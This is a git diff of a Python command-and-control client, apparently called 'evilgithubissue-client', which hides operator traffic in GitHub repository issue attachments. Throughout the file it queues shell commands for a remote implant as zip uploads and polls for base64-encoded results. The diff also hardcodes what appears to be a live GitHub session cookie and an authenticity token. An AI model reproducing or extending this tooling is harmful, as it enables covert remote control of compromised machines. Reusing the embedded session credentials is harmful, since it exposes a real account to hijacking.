@@ -1,3 +1,6 @@
+import shutil
+import signal
+import sys
 import base64
 import http.client
 import json
@@ -7,6 +10,7 @@ import html
 import configparser
 from urllib.parse import urlparse
 import color
+
 
 
 c2_github_config = configparser.ConfigParser()
@@ -33,7 +37,7 @@ def fetchRepoHtml(host, path):
 
     headers = {
         'Accept': 'text/html, application/xhtml+xml',
-        'Cookie': C2_GITHUB_ACCOUNT_COOKIE,
+        'Cookie': '_octo=GH1.1.717973473.1686160875; _device_id=fd912b07fd6b39c2c9e43b6e5a036a8d; user_session=omTftv8RT_OgDgsP0GggEsqWHCM14Vbk25TgZeXwFu-WqftD; __Host-user_session_same_site=omTftv8RT_OgDgsP0GggEsqWHCM14Vbk25TgZeXwFu-WqftD; logged_in=yes; dotcom_user=gokupwn; has_recent_activity=1; color_mode={"color_mode":"dark","light_theme":{"name":"light","color_mode":"light"},"dark_theme":{"name":"dark","color_mode":"dark"}}; preferred_color_mode=dark; tz=Europe/Paris; _gh_sess=UVlRWxdcd4XsniyLzZBJc5Grh+HRNHqhmvVpIuSOPbngEJjvNIb23LIfkA4JqTTDqzejehutFPdDh6fn438eUoRpEejVrcg8dwkTCK8JPiF7TU1KLAtzqaDVoYsxgJjDHEZ%2FFcDCCK5eYyorqZLdBOvW2pD9Qka8chum7IYFZVBBlyOfbhMkIlOiRIP0y5N8et19Dz6CuPpqVguYF7WnAikvUFlpeqvyACI1z7pQTmIqXobZQl9NOhOCutOV6iiz1%2BHMfmviFD1cFOkJAr4dHdDBXEE%2FAPpGPKtx7veH9goYSTmO5EbtS8yRr9ZL%2FX69aaryRmYEN3JXxlkd6dqvQCV%2FUEQGnxzqFcQ%2B4mAn4R2QL2GmxK6UNCVZ9rIGZAhHnR8p7nw%2BM%2FuCOkS5fgiGYrJimW3MgNz72JnJu3aElzTjcmTAA%2F4MwuJn8M6Sc21utUIOlElMaH9CmNMkFdY0ip2chqKblIdF1aY2iSxUqdH2qUnsCpyjbP%2FCd49TEMDSdNg2evqCYP%2B8BMq6%2FGJbF9FSlUeK9%2F8pTzV2tEU2Fseq8YDS28Fy8g==',
         'X-Requested-With': 'XMLHttpRequest',
         'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
         'User-Agent': C2_CLIENT_USER_AGENT,
@@ -128,7 +132,7 @@ def getUploadPolicy(repository_id, size):
         f"application/x-zip-compressed\r\n"
         f"--{boundary}\r\n"
         f"Content-Disposition: form-data; name=\"authenticity_token\"\r\n\r\n"
-        f"X68OrMZhOvStKX_fi-f8AmvDfTjyyVoQ1rIwxEwcqtuo39W8gcwTtpTb0yQMvG1jQEkQBOwrE-wY5I7Jb-MOQQ\r\n"
+        f"peVFfi0B7_rUsgTYzz9LaNpAgsZAswAbeh5l74G5j5VSlZ5uaqzGuO1AqCNIZNoJ8crv-l5RSee0SNviokYrDw\r\n"
         f"--{boundary}\r\n"
         f"Content-Disposition: form-data; name=\"repository_id\"\r\n\r\n"
         f"{repository_id}\r\n"
@@ -265,26 +269,44 @@ def scheduleTasks(task, task_retrieval_filename, repo_id):
     with open(task_retrieval_filename, 'a') as task_retrieval_filehandler:
         task_retrieval_filehandler.write( response['asset_upload_authenticity_token'] + ':' + response_2['href'] + '\n')
     return response_2['id']
-    
 
-def getTaskResult():
-    
-    task_id = 15100388 # manual for now
-    repo_id_result = getGithubRepoID(C2_RESULT_REPO)
+# This function will be used to configure the first_command and first_result IDs
+# It's a workaround until i find a way to get all issue attachements IDs
+def setup(repo_id_tasks, repo_id_result):
+    FIRST_TASK_ID = scheduleTasks('Starting CMD', 'scheduled.txt', repo_id_tasks)
+    c2_github_config.set('github', 'first_command', str(FIRST_TASK_ID))
+    FIRST_RESULT_ID = scheduleTasks('Starting Result', 'result.txt', repo_id_result)
+    c2_github_config.set('github', 'first_results', str(FIRST_RESULT_ID))
 
-    print("[*] Expecting the next result task id")
+    with open('server.ini', 'w') as serverConfigfile:
+        c2_github_config.write(serverConfigfile)
+    
+    return FIRST_TASK_ID, FIRST_RESULT_ID
+
+# NOT USED
+def updateConfig(FIRST_TASK_ID, FIRST_RESULT_ID):
+    c2_github_config.set('github', 'first_command', str(FIRST_TASK_ID))
+    c2_github_config.set('github', 'first_results', str(FIRST_RESULT_ID))
+
+    with open('server.ini', 'w') as serverConfigfile:
+        c2_github_config.write(serverConfigfile)
+
+
+
+def getTaskResult(repo_id_result, FIRST_RESULT_ID):
+    print("[*] Expecting the last task result id")
     expected_task_id = scheduleTasks('starting', 'result.txt', repo_id_result)
     print(expected_task_id)
 
-    while task_id < expected_task_id:
-        current_url = C2_RESULT_REPO + "/files/" + str(task_id) + "/result.zip"
+    while FIRST_RESULT_ID < expected_task_id:
+        current_url = C2_RESULT_REPO + "/files/" + str(FIRST_RESULT_ID) + "/result.zip"
         parsed_url = urlparse(current_url)
         connection = http.client.HTTPSConnection(parsed_url.hostname)
         connection.request("GET", parsed_url.path)
         response = connection.getresponse()
 
         if response.status != 404:
-            print(color.light_green("[+]") + f" Fetching Result For Task: {task_id}")
+            print(color.light_green("[+]") + f" Fetching Result For Task: {FIRST_RESULT_ID}")
 
             if response.status in (301, 302, 303, 307, 308):
                 connection = http.client.HTTPSConnection(urlparse(response.headers['Location']).hostname)
@@ -296,27 +318,43 @@ def getTaskResult():
                 fetched_result = (base64.b64decode(data)).decode('utf-8')
                 print(color.light_green("[+]"))
                 print(fetched_result)
-        task_id += 1
+        FIRST_RESULT_ID += 1
+    return FIRST_RESULT_ID
+
+def cancel_handler(sig, frame):
+    print(color.cyan("\n[~]") + " Shutdown Client")
+    # shutil.copy('server.ini',  '<timestamp>' + 'server.ini') # Will be used to gain persistent access to the retrieved data
+    sys.exit(0)
+
 
 
 def main():
-    repo_id = getGithubRepoID(C2_GITHUB_REPO)
+    signal.signal(signal.SIGINT, cancel_handler)
+    repo_id_tasks = getGithubRepoID(C2_GITHUB_REPO)
+    repo_id_result = getGithubRepoID(C2_RESULT_REPO)
+    # SETUP: will update the server.in file
+    # FIRST_TASK_ID: will be used by the implant
+    # Implant: Start from FIRST_TASK_ID to retrieve commands
+    FIRST_TASK_ID, FIRST_RESULT_ID = setup(repo_id_tasks, repo_id_result)
+
     while True:
-        print('github-c2-client> ', end='')
+        print('evilgithubissue-client> ', end='')
         command = input()
         if command == 'quit' or command == 'exit':
             print(color.cyan("[~]") + " Shutdown Client")
+            # shutil.copy('server.ini',  '23' + 'server.ini')
             sys.exit(1)
 
         else:
             if command == 'execute':
                 tasks = readTasksFile('task.zip')
                 for task in tasks:
-                    scheduleTasks(task, 'scheduled.txt', repo_id)
+                    scheduleTasks(task, 'scheduled.txt', repo_id_tasks)
             elif command == 'fetch':
-                getTaskResult()
+                getTaskResult(repo_id_result, FIRST_RESULT_ID)
             else:
                 writeTasksFile(command, 'task.zip')
+        #updateConfig(FIRST_TASK_ID, FIRST_RESULT_ID)
         print( color.light_green("[+]")+ f" Command Tasked: {command}")
 
 
